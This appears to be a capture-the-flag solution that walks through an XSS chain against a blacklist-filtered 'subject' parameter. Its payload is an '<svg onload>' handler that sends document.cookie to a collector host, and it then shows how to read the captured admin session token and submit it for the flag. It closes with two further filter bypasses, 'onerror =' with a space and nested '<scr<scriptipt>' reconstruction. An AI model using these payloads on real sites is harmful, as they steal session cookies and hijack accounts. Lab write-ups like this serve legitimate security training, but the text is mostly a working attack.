Full chain (using the `<svg onload>` bypass):

```
POST /report
Content-Type: application/json

{"url":"/?subject=<svg onload=\"new Image().src='http://collector:9000/report?c='+encodeURIComponent(document.cookie)\">"}
```

URL-encode the `subject` value when you build the path. None of the four blocked
substrings appear in it, so it reaches the `<div class="subject">` intact and
fires when the admin bot loads the page (~2s later).

Then read what the collector captured through the app's proxy:

```
GET /oob/received
```

You will see an item with a path like `/report?c=session%3D<32 hex>`. URL-decode
it (`%3D` → `=`) and take the 32-hex value — that is the admin session. Submit
it:

```
POST /solve
Content-Type: application/json

{"c":"<32 hex>"}
```

and you get `FLAG{...}`. (`/solve` accepts either the bare 32-hex value or the
full `session=<value>` string.)

Two more rungs of the same ladder, for reference:

- `onerror` with whitespace before the `=` — `<img src=x onerror ="…">` — is not
  the blocked `onerror=` substring, so it survives.
- Recursive reconstruction beats the single pass: `<scr<scriptipt>` becomes
  `<script>` after the inner `<script` is deleted once, because the filter never
  re-scans its own output.
